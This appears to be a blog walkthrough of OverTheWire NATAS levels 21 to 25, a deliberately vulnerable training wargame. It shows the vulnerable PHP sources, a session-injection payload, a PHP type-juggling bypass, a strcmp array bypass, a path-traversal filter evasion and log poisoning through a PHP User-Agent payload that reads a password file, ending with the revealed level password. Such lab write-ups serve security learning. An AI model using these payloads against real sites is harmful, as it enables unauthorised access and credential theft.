---
id: 266
title: 'OverTheWire: NATAS 21 &#8211; 25'
date: 2019-09-16T14:49:55-04:00
author: dwatts.comptech
layout: posts
guid: http://dustinwatts.me/?p=266
permalink: /2019/09/16/overthewire-natas-21/
categories:
  - OverTheWire
---
### LEVEL 21

<img class="alignnone size-full wp-image-269" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h49_33.png" alt="" width="596" height="229" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h49_33.png 596w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h49_33-300x115.png 300w" sizes="(max-width: 596px) 100vw, 596px" /> 

This level has a second site associated with it, where all the action is:

<img class="alignnone size-full wp-image-270" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h50_09.png" alt="" width="848" height="511" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h50_09.png 848w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h50_09-300x181.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_09h50_09-768x463.png 768w" sizes="(max-width: 848px) 100vw, 848px" /> 

#### Main Site

PHP sourcecode of the main page:

<pre class="lang:php decode:true">&lt;?

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:&lt;br&gt;";
    print "&lt;pre&gt;Username: natas22\n";
    print "Password: &lt;censored&gt;&lt;/pre&gt;";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}


session_start();
print_credentials();

?&gt;</pre>

The main site needs &#8220;admin&#8221; session variable set to 1 for us to get the next password.

#### Experimenter Site

The PHP sourcecode of the experimenter page:

<pre class="lang:php decode:true ">&lt;?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key =&gt; $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:&lt;br&gt;";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" =&gt; "center", "fontsize" =&gt; "100%", "bgcolor" =&gt; "yellow");
$form = "";

$form .= '&lt;form action="index.php" method="POST"&gt;';
foreach($validkeys as $key =&gt; $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;";
}
$form .= '&lt;input type="submit" name="submit" value="Update" /&gt;';
$form .= '&lt;/form&gt;';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "&lt;div style='$style'&gt;Hello world!&lt;/div&gt;";

?&gt;

&lt;p&gt;Example:&lt;/p&gt;
&lt;?=$example?&gt;

&lt;p&gt;Change example values here:&lt;/p&gt;
&lt;?=$form?&gt;</pre>

The first thing I noticed on the experimenter site is the use of &#8220;DEBUG&#8221; variable again, so I immediately set it for future use. When looking at the requests in Burp, I noticed the request for the main site and the experimenter site have different PHPSESSION cookie values, so that may be a problem when we&#8217;re trying to set &#8220;admin=1&#8221; for the main site.

There&#8217;s a line in the source that sets some HTML with values we have control over, so maybe we can inject HTML.  
<span class="lang:php decode:true crayon-inline ">$form .= &#8220;$key: <input name=&#8217;$key&#8217; value=&#8217;$val&#8217; /><br>&#8221;; </span>

Tested an injection of <span class="lang:xhtml decode:true crayon-inline">&#8216; /><br>admin:<input name=&#8217;admin&#8217; value=&#8217;1</span> on the &#8220;bgcolor&#8221; value. Success with the injection!  
<img class="alignnone size-full wp-image-272" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h11_15.png" alt="" width="599" height="431" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h11_15.png 599w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h11_15-300x216.png 300w" sizes="(max-width: 599px) 100vw, 599px" /> 

To use the debug flag while we submit the form, put it all in the address bar like &#8220;/index.php?debug&align=center&fontsize=100%25&bgcolor=yellow%27%20/%3E%3Cbr%3Eadmin:%3Cinput%20name=%27admin%27%20value=%271&submit=Update&#8221;  
<img class="alignnone size-full wp-image-273" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h20_28.png" alt="" width="848" height="581" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h20_28.png 848w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h20_28-300x206.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h20_28-768x526.png 768w" sizes="(max-width: 848px) 100vw, 848px" /> 

Looking at the page source for this is pretty revealing:

<pre class="lang:xhtml decode:true">&lt;html&gt;
&lt;head&gt;&lt;link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas21 - CSS style experimenter&lt;/h1&gt;
&lt;div id="content"&gt;
&lt;p&gt;
&lt;b&gt;Note: this website is colocated with &lt;a href="http://natas21.natas.labs.overthewire.org"&gt;http://natas21.natas.labs.overthewire.org&lt;/a&gt;&lt;/b&gt;
&lt;/p&gt;
[DEBUG] Session contents:&lt;br&gt;Array
(
    [align] =&gt; center
    [fontsize] =&gt; 100%
    [bgcolor] =&gt; yellow' /&gt;&lt;br&gt;admin:&lt;input name='admin' value='1
    [debug] =&gt; 
    [submit] =&gt; Update
)

&lt;p&gt;Example:&lt;/p&gt;
&lt;div style='background-color: yellow' /&gt;&lt;br&gt;admin:&lt;input name='admin' value='1; text-align: center; font-size: 100%;'&gt;Hello world!&lt;/div&gt;
&lt;p&gt;Change example values here:&lt;/p&gt;
&lt;form action="index.php" method="POST"&gt;align: &lt;input name='align' value='center' /&gt;&lt;br&gt;fontsize: &lt;input name='fontsize' value='100%' /&gt;&lt;br&gt;bgcolor: &lt;input name='bgcolor' value='yellow' /&gt;&lt;br&gt;admin:&lt;input name='admin' value='1' /&gt;&lt;br&gt;&lt;input type="submit" name="submit" value="Update" /&gt;&lt;/form&gt;
&lt;div id="viewsource"&gt;&lt;a href="index-source.html"&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>

From looking at the debug output, it looks like can modify our injection to get placed into the session array instead of the HTML. It&#8217;s a little easier to do within Burp Repeater than it would be in the browser:

<img class="alignnone wp-image-274 size-full" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h27_28.png" alt="" width="1229" height="771" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h27_28.png 1229w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h27_28-300x188.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h27_28-768x482.png 768w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h27_28-1024x642.png 1024w" sizes="(max-width: 1229px) 100vw, 1229px" />  
Success! Notice how &#8220;[admin] => 1&#8221; is injected into the session array.

All we should have to do is then change the PHPSESSID of the main site to this one and reload. Just load the main site request into Repeater and change the PHPSESSID value, then Send&#8230; BUT IT DOESN&#8217;T WORK!!

Maybe we _DO_ have to inject the value first into the HTML to set it into the Session Array.  
Since we have to interact with the &#8216;Update&#8217; button on the page, use the browser for this part. Use the HTML injection from earlier for the &#8220;bgcolor&#8221; value, <span class="lang:xhtml decode:true crayon-inline">yellow&#8217; /><br>admin:<input name=&#8217;admin&#8217; value=&#8217;1</span>  , then press the &#8216;Update&#8217; button. When you get the response, the HTML should be changed to include our admin value. Then press &#8216;Update&#8217; once more to add the values into the Session Array.

Check that it worked by using the Burp Repeater again on the main site, don&#8217;t forget to change the PHPSESSID value to the experimenter site!

<img class="alignnone wp-image-275 size-full" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h53_28.png" alt="" width="1230" height="772" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h53_28.png 1230w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h53_28-300x188.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h53_28-768x482.png 768w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_10h53_28-1024x643.png 1024w" sizes="(max-width: 1230px) 100vw, 1230px" /> 

AWESOME! It worked!

&nbsp;

### LEVEL 22

This level is almost completely blank on the HTML, only a link to the sourcecode! Let&#8217;s see it&#8230;

<pre class="lang:php decode:true">&lt;?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?&gt;


&lt;html&gt;
&lt;head&gt;
&lt;!-- This stuff in the header has nothing to do with the level --&gt;
&lt;link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"&gt;
&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /&gt;
&lt;link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /&gt;
&lt;script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"&gt;&lt;/script&gt;
&lt;script src="http://natas.labs.overthewire.org/js/jquery-ui.js"&gt;&lt;/script&gt;
&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;
&lt;script&gt;var wechallinfo = { "level": "natas22", "pass": "&lt;censored&gt;" };&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;natas22&lt;/h1&gt;
&lt;div id="content"&gt;

&lt;?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:&lt;br&gt;";
    print "&lt;pre&gt;Username: natas23\n";
    print "Password: &lt;censored&gt;&lt;/pre&gt;";
    }
?&gt;</pre>

This time it is checking for a variable &#8216;revelio&#8217;. And that&#8217;s ALL it&#8217;s checking for!! This level must be a Harry Potter joke.

Sure enough, that&#8217;s all it needed!  
<img class="alignnone wp-image-280 size-full" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h40_39.png" alt="" width="1228" height="774" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h40_39.png 1228w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h40_39-300x189.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h40_39-768x484.png 768w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h40_39-1024x645.png 1024w" sizes="(max-width: 1228px) 100vw, 1228px" /> 

Doing this from the browser doesn&#8217;t get the same results though, because there&#8217;s a redirect, &#8220;Location: /&#8221;.

&nbsp;

### LEVEL 23

<img class="alignnone size-full wp-image-281" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h46_04.png" alt="" width="600" height="186" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h46_04.png 600w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h46_04-300x93.png 300w" sizes="(max-width: 600px) 100vw, 600px" /> 

Here we only have a password entry form.

<pre class="lang:php decode:true ">Password:
&lt;form name="input" method="get"&gt;
    &lt;input type="text" name="passwd" size=20&gt;
    &lt;input type="submit" value="Login"&gt;
&lt;/form&gt;

&lt;?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] &gt; 10 )){
            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
            echo "&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;";
        }
        else{
            echo "&lt;br&gt;Wrong!&lt;br&gt;";
        }
    }
    // morla / 10111
?&gt;</pre>

Looks like the function strstr() is being used to search a variable &#8216;passwd&#8217; for the phrase &#8220;iloveyou&#8221;. The only other check is that &#8216;passwd&#8217; equals a number greater than 10. So there is a check for a number, and a check for a string. It appears that putting a mathematical operator in the second check must force it to treat the string as a number, dropping off the invalid non-numerical characters. Because &#8220;11iloveyou&#8221; works!!

<img class="alignnone size-full wp-image-282" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h57_55.png" alt="" width="599" height="265" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h57_55.png 599w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_11h57_55-300x133.png 300w" sizes="(max-width: 599px) 100vw, 599px" /> 

&nbsp;

### LEVEL 24

This is another password input form just like the last level. Here is the sourcecode for this one:

<pre class="lang:php decode:true">&lt;?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"&lt;censored&gt;")){
            echo "&lt;br&gt;The credentials for the next level are:&lt;br&gt;";
            echo "&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;";
        }
        else{
            echo "&lt;br&gt;Wrong!&lt;br&gt;";
        }
    }
    // morla / 10111
?&gt;</pre>

This password check is using strcmp() this time. Go straight to the [manual page](https://www.php.net/manual/en/function.strcmp.php) to see if there&#8217;s anything interesting about it. The first thing that catches my eye is the return values.

&#8220;Returns < 0 if <code class="parameter">str1</code> is less than <code class="parameter">str2</code>; > 0 if <code class="parameter">str1</code> is greater than <code class="parameter">str2</code>, and 0 if they are equal.  &#8221;

This is used in a boolean check, so &#8220;0&#8221; means False. There is a NOT operator on the strcmp(), so that would mean a &#8220;0&#8221; result means True now. The way to get the intended result is if the strings are equal. We&#8217;re probably not going to just guess the password, so maybe there is something else we can exploit in the return values.

One of the comments on the manual page is interesting:

> `<span class="html">strcmp() will return NULL on failure.</span>`
> 
> This has the side effect of equating to a match when using an equals comparison (==).  
> Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.
> 
> &#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;  
> Example  
> &#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;
> 
> $variable1 = array();  
> $ans === strcmp($variable1, $variable2);
> 
> This will stop $ans from returning a match;
> 
> Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.

Getting it to return NULL might give us a useful side effect. In the example in the comment, the variable is assigned an array to get a failure. So to force the &#8216;passwd&#8217; variable to an array, put in &#8220;/?passwd[]=something&#8221; for the query. That returns an error message and success!

<img class="alignnone size-full wp-image-284" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h29_45.png" alt="" width="848" height="493" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h29_45.png 848w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h29_45-300x174.png 300w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h29_45-768x446.png 768w" sizes="(max-width: 848px) 100vw, 848px" /> 

&nbsp;

### LEVEL 25

This level starts out with a block of text that gets replaced when you change the language setting.

<img class="alignnone size-full wp-image-287" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h47_46.png" alt="" width="595" height="683" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h47_46.png 595w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h47_46-261x300.png 261w" sizes="(max-width: 595px) 100vw, 595px" /> 

Sourcecode:

<pre class="lang:php decode:true ">&lt;?php
    // cheers and &lt;3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?&gt;

&lt;h1&gt;natas25&lt;/h1&gt;
&lt;div id="content"&gt;
&lt;div align="right"&gt;
&lt;form&gt;
&lt;select name='lang' onchange='this.form.submit()'&gt;
&lt;option&gt;language&lt;/option&gt;
&lt;?php foreach(listFiles("language/") as $f) echo "&lt;option&gt;$f&lt;/option&gt;"; ?&gt;
&lt;/select&gt;
&lt;/form&gt;
&lt;/div&gt;

&lt;?php  
    session_start();
    setLanguage();
    
    echo "&lt;h2&gt;$__GREETING&lt;/h2&gt;";
    echo "&lt;p align=\"justify\"&gt;$__MSG";
    echo "&lt;div align=\"right\"&gt;&lt;h6&gt;$__FOOTER&lt;/h6&gt;&lt;div&gt;";
?&gt;
&lt;p&gt;</pre>

Looking at the source there are a couple of things that jump out at me. First is the homegrown checks on input for the language file. Those checks can probably be gotten around. Also there is a logfile getting written to that may be vulnerable to a stored XSS type of attack.

#### Objective 1

Try to get around the checks on the included language file.

I started out with getting one of the checks to fail, to see what would happen and to create the log file, using &#8220;/?lang=/../logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log&#8221;  
There was no obvious result on the response page, but maybe the log file was created.

Next I tried &#8220;/?lang=/&#8230;/./logs/natas25_g2ouhkp80fj036rpalvnpb9l13.log&#8221;. Important point being the &#8220;../&#8221; was removed from &#8220;/&#8230;/./&#8221;, leaving &#8220;/../&#8221; correctly in place.  
I get the expected log output as:

<pre class="lang:xhtml highlight:0 decode:true ">[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."</pre>

<img class="alignnone size-full wp-image-288" src="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h58_22.png" alt="" width="599" height="531" srcset="http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h58_22.png 599w, http://dustinwatts.me/wp-content/uploads/2019/09/2019-09-19_12h58_22-300x266.png 300w" sizes="(max-width: 599px) 100vw, 599px" /> 

#### Objective 2

Get around the check for &#8220;natas_webpass&#8221;.

Stored XSS is likely possible on the log file using the User-Agent string, since that gets saved. Injecting some PHP that reads &#8220;natas_webpass&#8221; should bypass the check on our variable.

Write &#8220;User-Agent: <?php include(&#8220;/etc/natas_webpass/natas26&#8243;); ?>&#8221; into the HTTP header using Burp Repeater:

<pre class="lang:php highlight:0 decode:true">[19.09.2019 12::52:19] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::54:32] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 12::56:21] Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 "Directory traversal attempt! fixing request."
[19.09.2019 13::05:45] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
33 "Directory traversal attempt! fixing request."</pre>

Success!!

&nbsp;